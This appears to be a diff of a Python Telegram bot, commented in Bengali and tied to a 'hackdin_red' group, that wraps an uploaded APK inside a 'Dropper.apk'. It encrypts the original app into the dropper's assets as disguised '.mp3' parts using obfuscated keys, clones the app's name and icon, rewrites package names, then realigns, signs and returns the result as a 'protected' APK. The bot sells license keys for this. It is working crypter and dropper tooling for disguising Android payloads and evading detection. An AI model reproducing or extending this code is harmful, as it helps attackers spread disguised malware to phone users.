@@ -47,12 +47,12 @@ else:
 # ----- গ্রুপ ও লিমিট -----
 REQUIRED_GROUP = "@hackdin_red"
 GROUP_INVITE_LINK = "https://t.me/hackdin_red"
-DAILY_LIMIT = 1  # ফ্রি ব্যবহারের সীমা
+DAILY_LIMIT = 1
 
-# ----- অ্যাডমিন আইডি (যে ইউজার /genkey ব্যবহার করতে পারবে) -----
-ADMIN_USER_ID = 6593195102  # <-- আপনার টেলিগ্রাম আইডি বসান
+# ----- অ্যাডমিন আইডি -----
+ADMIN_USER_ID = 6593195102
 
-# ----- ক্রিপ্টো (আপনার দেওয়া কী) -----
+# ----- ক্রিপ্টো -----
 OBFUSCATED_AES_KEY_B64 = "Xe53JgjByDVFfeZl9W+TyCcATz4ux1PHf9Mih7Vsre0="
 OBFUSCATED_XOR_KEY_B64 = "W5MCyVrJGGKwWtgXFNS6PvlaH1Xivh/MHO8T+PIhKMd7Eb8+R4NmX23lQBNVefrFbSmG+jNjxZCHBxVos/irfbjkBdfFmp1YIXlQXTXO/HUTCLDghib+WSmsdR4BPVDVQaXHBkclBjuhChvOCSnYolaowwAEkpLlMmfPM0+gkV9NHys8e85JEjmBg5izx48HVVifiL4YhsuxWlKJLfLHodezX2v93DIztfL+UAzGHxtOHfwRagmedxyX+jD18GfpFmLO6GjlUTiymXzGu0uRFuwAd4+o70Yf0Istzoj8h7Az1J33aTQFF5XKAu32zetVnMG1bFQSaQcfm9U1vWcFC0F6ArJNxES6Tar8Bg=="
 
@@ -68,10 +68,10 @@ ACTUAL_AES_KEY = decode_obfuscated(OBFUSCATED_AES_KEY_B64)
 ACTUAL_XOR_KEY = decode_obfuscated(OBFUSCATED_XOR_KEY_B64)
 IV_HEX = "aabbccddeeffaabbccddeeffaabbccdd"
 NUM_PARTS = 15
-PREFIX = "part_"   # getSecret(3) খালি স্ট্রিং দিলে ফাইল নাম 0.mp3, 1.mp3 ...
+PREFIX = "part_"   # getSecret(3) খালি স্ট্রিং দিলে 0.mp3, 1.mp3 ...
 TARGET_PACKAGE = "com.meteah.apl"
 
-# ----- ডাটাবেস (কী + ডেইলি লিমিট ট্র্যাক) -----
+# ----- ডাটাবেস -----
 DB_PATH = 'db/keys.db'
 os.makedirs('db', exist_ok=True)
 
@@ -225,6 +225,7 @@ async def process_apk_file(update: Update, context: ContextTypes.DEFAULT_TYPE, a
         with open(input_apk, 'wb') as f:
             f.write(apk_data)
 
+        # 1. ইউজারের APK ডিকম্পাইল (শুধু নাম/আইকন বের করার জন্য)
         decoded_user = os.path.join(work_dir, 'decoded_user')
         cmd = f"apktool d -f -o {decoded_user} {input_apk}"
         result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
@@ -246,6 +247,7 @@ async def process_apk_file(update: Update, context: ContextTypes.DEFAULT_TYPE, a
             except:
                 pass
 
+        # 2. Dropper.apk ডিকম্পাইল
         dropper_apk = os.path.join(os.getcwd(), 'Dropper.apk')
         if not os.path.exists(dropper_apk):
             await context.bot.send_message(chat_id, "❌ Dropper.apk not found! Please place it in the bot directory.")
@@ -257,9 +259,11 @@ async def process_apk_file(update: Update, context: ContextTypes.DEFAULT_TYPE, a
             await context.bot.send_message(chat_id, f"❌ Dropper decode failed:\n{result.stderr[:500]}")
             return
 
+        # 3. অ্যাসেট রিপ্লেস (manifest.json + .mp3)
         assets_dir = os.path.join(decoded_dropper, 'assets')
         process_encryption(apk_data, assets_dir)
 
+        # 4. নাম ও আইকন কপি
         res_user = os.path.join(decoded_user, 'res')
         res_dropper = os.path.join(decoded_dropper, 'res')
         if os.path.exists(res_user):
@@ -287,13 +291,33 @@ async def process_apk_file(update: Update, context: ContextTypes.DEFAULT_TYPE, a
             except:
                 pass
 
+        # 5. প্যাকেজ নাম পরিবর্তন (সমস্ত XML ফাইলে)
+        # প্রথমে Dropper-এর original package name বের করি
         manifest_path = os.path.join(decoded_dropper, 'AndroidManifest.xml')
         if os.path.exists(manifest_path):
             with open(manifest_path, 'r', encoding='utf-8') as f:
                 content = f.read()
-            # ----- Package name change -----
+            match = re.search(r'package="([^"]+)"', content)
+            if match:
+                old_package = match.group(1)
+                # সমস্ত XML ফাইলের package অ্যাট্রিবিউট রিপ্লেস করি
+                for root, dirs, files in os.walk(decoded_dropper):
+                    for file in files:
+                        if file.endswith('.xml'):
+                            file_path = os.path.join(root, file)
+                            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
+                                xml_content = f.read()
+                            # রিপ্লেস (শুধু package="..." অ্যাট্রিবিউট)
+                            new_content = re.sub(r'package="' + re.escape(old_package) + r'"', f'package="{TARGET_PACKAGE}"', xml_content)
+                            if new_content != xml_content:
+                                with open(file_path, 'w', encoding='utf-8') as f:
+                                    f.write(new_content)
+            # এখন Manifest-এ label/icon সেট করি
+            with open(manifest_path, 'r', encoding='utf-8') as f:
+                content = f.read()
+            # package attribute override
             content = re.sub(r'package="[^"]*"', f'package="{TARGET_PACKAGE}"', content)
-            # ----- Label & icon -----
+            # label & icon
             if 'android:label="' in content:
                 content = re.sub(r'android:label=".*?"', 'android:label="@string/app_name"', content)
             else:
@@ -305,6 +329,7 @@ async def process_apk_file(update: Update, context: ContextTypes.DEFAULT_TYPE, a
             with open(manifest_path, 'w', encoding='utf-8') as f:
                 f.write(content)
 
+        # 6. রিকম্পাইল
         output_apk = os.path.join(work_dir, 'output.apk')
         cmd = f"apktool b -o {output_apk} {decoded_dropper}"
         result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
@@ -312,7 +337,15 @@ async def process_apk_file(update: Update, context: ContextTypes.DEFAULT_TYPE, a
             await context.bot.send_message(chat_id, f"❌ Rebuild failed:\n{result.stderr[:500]}")
             return
 
-        # ----- Sign with apksigner (v1/v2/v3/v4) -----
+        # 7. অ্যালাইন (প্রথমে)
+        aligned_apk = os.path.join(work_dir, 'aligned.apk')
+        try:
+            subprocess.run(f"zipalign -v -p 4 {output_apk} {aligned_apk}", shell=True, check=True)
+        except Exception as e:
+            await context.bot.send_message(chat_id, f"❌ Alignment failed: {str(e)}")
+            return
+
+        # 8. সাইন (অ্যালাইন করার পর)
         keystore = os.path.join(os.getcwd(), 'signer', 'myKey.p12')
         if not os.path.exists(keystore):
             await context.bot.send_message(chat_id, "❌ Keystore not found! Please upload signer/myKey.p12")
@@ -324,20 +357,24 @@ async def process_apk_file(update: Update, context: ContextTypes.DEFAULT_TYPE, a
         else:
             passwd = os.environ.get('KEYSTORE_PASS', '123456')
 
-        cmd = f"apksigner sign --ks {keystore} --ks-pass pass:{passwd} --v1-signing-enabled true --v2-signing-enabled true --v3-signing-enabled true --v4-signing-enabled true {output_apk}"
+        # apksigner দিয়ে সাইন (v1–v4)
+        cmd = f"apksigner sign --ks {keystore} --ks-pass pass:{passwd} --v1-signing-enabled true --v2-signing-enabled true --v3-signing-enabled true --v4-signing-enabled true {aligned_apk}"
         result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
         if result.returncode != 0:
             await context.bot.send_message(chat_id, f"❌ Signing failed:\n{result.stderr[:500]}")
             return
 
-        # ----- Align -----
-        aligned_apk = os.path.join(work_dir, 'aligned.apk')
-        try:
-            subprocess.run(f"zipalign -v -p 4 {output_apk} {aligned_apk}", shell=True, check=True)
-            final_apk = aligned_apk
-        except:
-            final_apk = output_apk
+        # 9. ভেরিফাই
+        verify_cmd = f"apksigner verify {aligned_apk}"
+        verify_result = subprocess.run(verify_cmd, shell=True, capture_output=True, text=True)
+        if verify_result.returncode != 0:
+            await context.bot.send_message(chat_id, f"⚠️ Verification failed:\n{verify_result.stderr[:500]}")
+        else:
+            logger.info("APK verification successful")
 
+        final_apk = aligned_apk
+
+        # 10. ইউজারকে পাঠান
         with open(final_apk, 'rb') as f:
             await context.bot.send_document(chat_id, f, filename="protected_app.apk")
         await context.bot.send_message(chat_id, "✅ Done! Your protected APK is ready.")
@@ -402,7 +439,6 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 await query.edit_message_text("📤 You have a valid license. Send your APK file.")
                 return
             else:
-                # ----- Free trial expired message -----
                 await query.edit_message_text(
                     "❌ You expire free tral limit try tomorrow.\n"
                     "To get more usage, contact @Red_teem for a license key."
@@ -413,7 +449,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 async def upload_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
 
-    # গ্রুপ চেক – শুধু একটি বার জানান, ব্লক করবেন না
+    # গ্রুপ চেক
     try:
         chat_id = "@" + REQUIRED_GROUP.lstrip("@")
         member = await context.bot.get_chat_member(chat_id, user_id)
@@ -432,7 +468,6 @@ async def upload_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         if validate_key(user_id):
             pass
         else:
-            # ----- Free trial expired message -----
             await update.message.reply_text(
                 "❌ You expire free tral limit try tomorrow.\n"
                 "To get more usage, contact @Red_teem for a license key."
@@ -453,7 +488,7 @@ async def upload_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     except Exception as e:
         await update.message.reply_text(f"❌ Failed to download: {str(e)}")
 
-# ----- অ্যাক্টিভেট কমান্ড -----
+# ----- অ্যাক্টিভেট -----
 async def activate(update: Update, context: ContextTypes.DEFAULT_TYPE):
     args = context.args
     if not args:
@@ -466,7 +501,7 @@ async def activate(update: Update, context: ContextTypes.DEFAULT_TYPE):
     else:
         await update.message.reply_text("❌ Invalid key. Please contact @Red_teem to get a valid key.")
 
-# ----- অ্যাডমিন কমান্ড -----
+# ----- অ্যাডমিন -----
 async def genkey_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_user.id != ADMIN_USER_ID:
         await update.message.reply_text("❌ You are not authorized to use this command.")
